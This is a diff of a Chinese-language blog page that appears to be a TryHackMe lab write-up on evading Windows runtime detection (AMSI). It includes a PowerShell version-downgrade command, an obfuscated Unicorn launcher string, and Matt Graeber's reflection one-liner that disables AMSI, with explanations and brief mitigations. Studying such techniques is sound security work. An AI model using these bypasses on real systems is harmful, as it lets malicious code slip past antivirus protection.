@@ -3,7 +3,7 @@
   <head><meta charset="UTF-8" />
 <meta http-equiv="X-UA-Compatible" content="IE=edge" />
 <meta name="generator" content="Hugo 0.124.1">
-<meta name="viewport" content="width=device-width, initial-scale=1" /><title>Windows | Bad Wichell</title>
+<meta name="viewport" content="width=device-width, initial-scale=1" /><meta name="description" content="了解如何使用与工具无关的现代方法绕过常见的运行时检测措施，例如 AMSI。" /><title>Runtime Detection Evasion | Bad Wichell</title>
 
 <link
   rel="icon"
@@ -309,36 +309,36 @@
   <div id="sidebarWrapper" class="is-fixed">
     <div id="sidebar" class="is-marginless">
       <aside class="menu is-paddingless is-marginless">
-        <ul class="menu-list is-marginless is-paddingless"><div class="card is-fs-expandable-icon"><div class="card-header">
+        <ul class="menu-list is-marginless is-paddingless"><div class="card is-fs-expandable-icon is-sidebar-active"><div class="card-header">
       <a
         href='/attack/'
         class='card-header-title'>
         <i class='fa-solid fa-ghost fa-lg'></i></a></div>
       </div><div class="is-expandable">
-      <div class="is-sidebar-list-wrapper"><li class="is-marginless is-entries-expandable is-entries-shrinked"><div
+      <div class="is-sidebar-list-wrapper"><li class="is-marginless is-tree-active is-entries-expandable is-entries-expanded"><div
             class="card"><div class="card-header">
       <a
         href='/attack/'
         class='card-header-title'
           title='Attack'>
-        <i class='fa-solid fa-ghost fa-lg'></i><p class="pt-0 pb-0 pr-2 pl-1">Attack</p></a><a class="card-header-icon is-icon-expandable is-paddingless is-icon-shrinked">
+        <i class='fa-solid fa-ghost fa-lg'></i><p class="pt-0 pb-0 pr-2 pl-1">Attack</p></a><a class="card-header-icon is-icon-expandable is-paddingless is-icon-expanded">
                 <span class='icon'></span>
               </a>
             </div>
-          </div><ul class="is-marginless"><div class="">
-      <div class=""><li class="is-marginless is-entries-expandable is-entries-shrinked"><div
+          </div><ul class="is-marginless is-tree-active"><div class="">
+      <div class=""><li class="is-marginless is-entries-expandable is-entries-expanded"><div
             class="card"><div class="card-header">
       <a
         href='/attack/tryhackme/'
         class='card-header-title'
           title='Tryhackme'>
-        <i class='fa-solid fa-ghost'></i><p class="pt-0 pb-0 pr-2 pl-0">Tryhackme</p></a><a class="card-header-icon is-icon-expandable is-paddingless is-icon-shrinked">
+        <i class='fa-solid fa-ghost'></i><p class="pt-0 pb-0 pr-2 pl-0">Tryhackme</p></a><a class="card-header-icon is-icon-expandable is-paddingless is-icon-expanded">
                 <span class='icon'></span>
               </a>
             </div>
           </div><ul class="is-marginless"><div class="">
       <div class=""><li class="is-marginless"><div
-            class="card"><div class="card-header is-single-link">
+            class="card is-sidebar-active"id='sidebarActiveEntry'><div class="card-header is-single-link">
       <a
         href='/attack/tryhackme/runtime-detection-evasion/'
         class='card-header-title'
@@ -471,24 +471,172 @@
   </div>
 </div>
 <div id="sidebarMobileWrapper" class="column is-narrow is-hidden-desktop"></div>
-<div class='column is-marginless' id='contentContainer'><div id="contentTitle">Tag: Windows</div>
-<div class='tile is-ancestor is-marginless'><div class='tile is-parent'>
-      <article class='tile is-child message'>
-        <div class='message-header'>Runtime Detection Evasion</div>
-        <div class='message-body'>
-          <p>了解如何使用与工具无关的现代方法绕过常见的运行时检测措施，例如 AMSI。</p>
-          <a class='is-pretty-link' href='https://example.org/attack/tryhackme/runtime-detection-evasion/'>...Read more</a>
-        </div>
-      </article>
-    </div><div class='tile is-parent'>
-      <article class='tile is-child message'>
-        <div class='message-header'>Post-Exploitation Basics</div>
-        <div class='message-body'>
-          <p>Learn the basics of post-exploitation and maintaining access with mimikatz, bloodhound, powerview and msfvenom.</p>
-          <a class='is-pretty-link' href='https://example.org/attack/tryhackme/post-exploitation-basics-%E5%90%8E%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/'>...Read more</a>
-        </div>
-      </article>
-    </div></div>
+<div class="columns is-mobile is-marginless is-scroll-smooth has-toc" id="contentContainer">
+  <div class="column" id="content"><div id="contentTitle">Runtime Detection Evasion</div>
+<p><img
+  src="https://raw.githubusercontent.com/likeusosad/badwichellimg/main/20240401133804.png"
+  alt=""
+  class=""/>
+</p>
+<h1 id='房间信息'>房间信息<a href='#%e6%88%bf%e9%97%b4%e4%bf%a1%e6%81%af' class='anchor'>#</a>
+</h1><table>
+<thead>
+<tr>
+<th>房间名称</th>
+<th><a
+  href="https://tryhackme.com/r/room/runtimedetectionevasion"
+    class="is-pretty-link">https://tryhackme.com/r/room/runtimedetectionevasion</a
+>
+</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>描述</td>
+<td>运行时检测规避</td>
+</tr>
+<tr>
+<td>难度</td>
+<td>Hard</td>
+</tr>
+<tr>
+<td>作者</td>
+<td>BadWiChell</td>
+</tr>
+</tbody>
+</table>
+<h1 id='任务一'>任务一<a href='#%e4%bb%bb%e5%8a%a1%e4%b8%80' class='anchor'>#</a>
+</h1><h2 id='介绍'>介绍<a href='#%e4%bb%8b%e7%bb%8d' class='anchor'>#</a>
+</h2><p>随着 PowerShell &lt;3 的发布，蓝队 Microsoft 发布了 AMSI（反恶意软件扫描接口），这是一种运行时监控解决方案，旨在阻止和监控持续的威胁。</p>
+<p>学习目标</p>
+<ul>
+<li>了解运行时检测的目的及其检测方式。</li>
+<li>学习并应用绕过 AMSI 的技术。</li>
+<li>了解常见的缓解措施和潜在的技术替代方案。</li>
+</ul>
+<p>在执行恶意代码时，运行时检测措施可能会导致许多麻烦和障碍。幸运的是，作为攻击者，我们可以滥用和利用多种技术和方法来绕过常见的运行时检测解决方案。</p>
+<h1 id='任务二'>任务二<a href='#%e4%bb%bb%e5%8a%a1%e4%ba%8c' class='anchor'>#</a>
+</h1><p>在执行代码或应用程序时，无论解释器如何，它几乎总是会流经运行时。这在使用 Windows API 调用和与 .NET 交互时最常见。CLR（公共语言运行时）和 DLR（动态语言运行时）是 .NET 的运行时，是使用 Windows 系统时最常遇到的运行时。在此任务中，我们不会讨论运行时的细节;相反，我们将讨论如何监控它们并检测恶意代码。</p>
+<p>运行时检测度量将在运行时执行之前扫描代码，并确定它是否是恶意的。根据检测措施及其背后的技术，此检测可能基于字符串签名、启发式或行为。如果代码被怀疑是恶意的，它将被分配一个值，如果在指定的范围内，它将停止执行，并可能隔离或删除文件/代码。</p>
+<p>运行时检测措施与标准防病毒软件不同，因为它们将直接从内存和运行时进行扫描。同时，防病毒产品还可以利用这些运行时检测来更深入地了解源自代码的调用和钩子。在某些情况下，防病毒产品可能会使用运行时检测流/源作为其启发式方法的一部分。</p>
+<h1 id='任务三'>任务三<a href='#%e4%bb%bb%e5%8a%a1%e4%b8%89' class='anchor'>#</a>
+</h1><p>AMSI（反恶意软件扫描接口）是一项 PowerShell 安全功能，允许任何应用程序或服务直接集成到反恶意软件产品中。Defender 检测 AMSI 以在 .NET 运行时内执行之前扫描有效负载和脚本。来自Microsoft：“Windows 反恶意软件扫描接口 （AMSI） 是一种通用接口标准，它允许您的应用程序和服务与计算机上存在的任何反恶意软件产品集成。AMSI 为您的最终用户及其数据、应用程序和工作负载提供增强的恶意软件保护。有关 AMSI 的详细信息，请查看 Windows 文档。</p>
+<p>AMSI将根据监视和扫描的结果，根据响应代码确定其操作。以下是可能的响应代码列表，</p>
+<ul>
+<li>AMSI_RESULT_CLEAN = 0</li>
+<li>AMSI_RESULT_NOT_DETECTED = 1</li>
+<li>AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384</li>
+<li>AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479</li>
+<li>AMSI_RESULT_DETECTED = 32768</li>
+</ul>
+<p>这些响应代码将仅在 AMSI 的后端或通过第三方实现进行报告。如果 AMSI 检测到恶意结果，它将停止执行并发送以下错误消息。</p>
+<p>AMSI 已完全集成到以下 Windows 组件中：</p>
+<ul>
+<li>用户帐户控制或 UAC</li>
+<li> PowerShell的</li>
+<li>Windows 脚本宿主（wscript 和 cscript）</li>
+<li> JavaScript 和 VBScript</li>
+<li> Office VBA 宏</li>
+</ul>
+<p>作为攻击者，在针对上述组件时，我们需要在执行代码或滥用组件时注意 AMSI 及其实现。</p>
+<p>在下一个任务中，我们将介绍 AMSI 在 Windows 中的工作原理和检测方式背后的技术细节。</p>
+<p><img
+  src="https://raw.githubusercontent.com/likeusosad/badwichellimg/main/20240401134632.png"
+  alt=""
+  class=""/>
+</p>
+<p>在上图中，数据将开始流动，具体取决于使用的解释器（PowerShell/VBScript/等）当数据在每一层的模型中向动时，将对各种 API 调用和接口进行检测。了解 AMSI 的完整模型很重要，但我们可以将其分解为核心组件，如下图所示。</p>
+<p><img
+  src="https://raw.githubusercontent.com/likeusosad/badwichellimg/main/20240401134914.png"
+  alt=""
+  class=""/>
+
+注意：仅当从 CLR 执行时从内存加载时，才会检测 AMSI。假定 if on disk MsMpEng.exe （Windows Defender） 已被检测。</p>
+<p>我们的大多数研究和已知绕过都放置在 Win32 API 层中，操纵 AmsiScanBuffer API 调用。</p>
+<p>您可能还会注意到 AMSI 的“其他应用程序”界面。AV 提供商等第三方可以从其产品中检测 AMSI。Microsoft 记录了 AMSI 函数和 AMSI 流接口。</p>
+<hr>
+<p>我们可以分解 AMSI PowerShell 检测的代码，以更好地了解其实现方式并检查可疑内容。要查找 AMSI 的检测位置，我们可以使用由 Cobbr 维护的 InsecurePowerShell。InsecurePowerShell 是 PowerShell 的 GitHub 分支，删除了安全功能;这意味着我们可以查看比较的提交并观察任何安全功能。AMSI 仅在 下的 <code>src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs</code> 12 行代码中进行检测。这十二行如下所示。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>var scriptExtent <span style="color:#f92672">=</span> scriptBlockAst.Extent;
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (AmsiUtils.ScanContent(scriptExtent.Text, scriptExtent.File) <span style="color:#f92672">==</span> AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED)
+</span></span><span style="display:flex;"><span> {
+</span></span><span style="display:flex;"><span>  var parseError <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ParseError(scriptExtent, <span style="color:#e6db74">&#34;ScriptContainedMaliciousContent&#34;</span>, ParserStrings.ScriptContainedMaliciousContent);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ParseException</span>(<span style="color:#66d9ef">new</span>[] { parseError });
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (ScriptBlock.CheckSuspiciousContent(scriptBlockAst) <span style="color:#f92672">!=</span> null)
+</span></span><span style="display:flex;"><span> {
+</span></span><span style="display:flex;"><span>  HasSuspiciousContent <span style="color:#f92672">=</span> true;
+</span></span><span style="display:flex;"><span> }
+</span></span></code></pre></div><hr>
+<p>我们可以利用我们对 AMSI 如何检测的知识以及其他人的研究来创建和使用滥用和逃避 AMSI 或其实用程序的旁路。</p>
+<h1 id='任务四'>任务四<a href='#%e4%bb%bb%e5%8a%a1%e5%9b%9b' class='anchor'>#</a>
+</h1><h2 id='powershell-降级'>powershell 降级<a href='#powershell-%e9%99%8d%e7%ba%a7' class='anchor'>#</a>
+</h2><p>PowerShell 降级攻击是一个非常容易实现的目标，它允许攻击者修改当前的 PowerShell 版本以删除安全功能。</p>
+<p>大多数 PowerShell 会话将从最新的 PowerShell 引擎开始，但攻击者可以使用单行代码手动更改版本。通过将 PowerShell 版本“降级”到 2.0，可以绕过安全功能，因为它们直到 5.0 版才实现。</p>
+<p>攻击只需要一行即可在我们的会话中执行。我们可以启动一个新的 PowerShell 进程，其中包含指定版本 （2） <code>-Version</code> 的标志。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PowerShell -Version <span style="color:#ae81ff">2</span>
+</span></span></code></pre></div><p>这种攻击可以在 Unicorn 等工具中被积极利用。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>full_attack = <span style="color:#e6db74">&#39;&#39;&#39;powershell /w 1 /C &#34;sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\&#39;&#39;&#39;&#39;.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + &#34;)&#34; + &#39;</span><span style="color:#e6db74">&#34;&#39;
+</span></span></span></code></pre></div><p>由于这种攻击唾手可得，而且技术简单，蓝队有很多方法可以检测和缓解这种攻击。</p>
+<p>两个最简单的缓解措施是从设备中删除 PowerShell 2.0 引擎，并通过应用程序阻止列表拒绝对 PowerShell 2.0 的访问。</p>
+<h2 id='powershell-反射'>Powershell 反射<a href='#powershell-%e5%8f%8d%e5%b0%84' class='anchor'>#</a>
+</h2><p>反射允许用户或管理员访问 .NET 程序集并与之交互。从 Microsoft 文档中，“程序集构成了 . 的部署、版本控制、重用、激活范围和安全权限的基本单元。基于 NET 的应用程序。 .NET 程序集可能看起来很陌生;但是，我们可以通过知道它们以熟悉的格式（如 exe（可执行文件）和 DLL（动态链接库））的形式来使它们更加熟悉。</p>
+<p>PowerShell 反射可以被滥用来修改和识别有价值的 DLL 中的信息。</p>
+<p>PowerShell 的 AMSI 实用工具存储在位于 中的 <code>AMSIUtils</code> <code>System.Management.Automation.AmsiUtils</code> .NET 程序集中。</p>
+<p>Matt Graeber 发表了一句话，以实现使用 Reflection 修改和绕过 AMSI 实用程序的目标。这行可以在下面的代码块中看到。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>[<span style="color:#66d9ef">Ref</span>].Assembly.GetType(<span style="color:#e6db74">&#39;System.Management.Automation.AmsiUtils&#39;</span>).GetField(<span style="color:#e6db74">&#39;amsiInitFailed&#39;</span>,<span style="color:#e6db74">&#39;NonPublic,Static&#39;</span>).SetValue($null,$true)
+</span></span></code></pre></div><p>为了解释代码功能，我们将把它分解成更小的部分。</p>
+<p>首先，代码段将调用反射函数并指定它要使用程序 <code>[Ref.Assembly]</code> 集，然后使用 <code>GetType</code> 获取 AMSI 实用程序的类型。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>[<span style="color:#66d9ef">Ref</span>].Assembly.GetType(<span style="color:#e6db74">&#39;System.Management.Automation.AmsiUtils&#39;</span>)
+</span></span></code></pre></div><p>从上一节收集的信息将转发到下一个函数，以使用 <code>GetField</code> 获取程序集中的指定字段。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.GetField(<span style="color:#e6db74">&#39;amsiInitFailed&#39;</span>,<span style="color:#e6db74">&#39;NonPublic,Static&#39;</span>)
+</span></span></code></pre></div><p>然后，程序集和字段信息将转发到下一个参数，以将值从 <code>$false</code> 设置为 <code>$true</code> using <code>SetValue</code> 。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.SetValue($null,$true)
+</span></span></code></pre></div><p>一旦 <code>amsiInitFailed</code> 该字段设置为 <code>$true</code> ，AMSI 将使用响应代码进行响应：AMSI_RESULT_NOT_DETECTED = 1</p>
+</div><div class="column is-sticky is-paddingless" id="tocWrapper">
+  <div class="is-paddingless" id="tocContainer">
+    <div class="toc-header">
+      <h6 class="toc-title is-marginless">On this page:</h6>
+      <i
+        title="Back to top"
+        id="tocBackToTop"
+        class="fa-solid fa-circle-arrow-up"
+      ></i>
+    </div>
+    <div id="tocContent">
+      <div id="toc"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#介绍">介绍</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#powershell-降级">powershell 降级</a></li>
+    <li><a href="#powershell-反射">Powershell 反射</a></li>
+  </ul>
+</nav></div>
+      <div id="taxonomies"><div class="taxonomy-wrapper"><div class="toc-header">
+                  <h6 class="toc-title is-marginless">Categories</h6>
+                </div><a href="/categories/tryhackme/" class="taxonomy"
+                    ><i class="fa-solid fa-circle-dot"></i>Tryhackme</a
+                  ></div><div class="taxonomy-wrapper"><div class="toc-header">
+                  <h6 class="toc-title is-marginless">Tags</h6>
+                </div><a href="/tags/windows/" class="taxonomy"
+                    ><i class="fa-solid fa-circle-dot"></i>Windows</a
+                  ><a href="/tags/tryhackme/" class="taxonomy"
+                    ><i class="fa-solid fa-circle-dot"></i>Tryhackme</a
+                  ><a href="/tags/%E7%BB%95%E8%BF%87-uac/" class="taxonomy"
+                    ><i class="fa-solid fa-circle-dot"></i>绕过 UAC</a
+                  ></div></div>
+    </div>
+  </div>
+  <div
+    class="is-paddingless"
+    id="tocCollapsible"
+    title="Collapse/Uncollapse table of contents"
+  >
+    <i class="fa-solid fa-angles-right fa-lg"></i>
+  </div>
+</div>
 </div>
 </div><script type='text/javascript'>
   const baseUrl = 'https:\/\/example.org\/';
